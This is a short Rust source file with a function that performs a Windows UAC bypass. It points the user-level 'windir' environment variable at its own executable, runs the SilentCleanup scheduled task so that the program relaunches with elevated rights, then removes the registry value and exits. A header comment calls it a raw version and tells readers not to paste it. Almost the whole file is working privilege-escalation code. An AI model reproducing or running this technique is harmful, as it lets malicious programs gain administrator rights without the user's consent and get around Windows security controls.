/* Very raw version. Please don't copy paste this piece of trash. Instead implement it on your own */

use std::process::Command;


pub unsafe fn self_elevate() {
    // Check the elevation
    if !is_elevated() {

        // Add
        let mut x = Command::new("cmd").args(&[
            "/C",
            &*format!("REG ADD HKCU\\Environment /v windir /d \"{}\"",
                      std::env::current_exe().unwrap().to_str().unwrap()
            ),
            "/f",
        ]).output().unwrap();

        // Run
        x = Command::new("cmd").args(&[
            "/C",
            "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
        ]).output().unwrap();

        // Delete
        x = Command::new("cmd").args(&[
            "/C",
            "REG DELETE HKCU\\Environment /v windir /f"
        ]).output().unwrap();

        // Exit
        ProcessHandler::kill_self();
    }
}
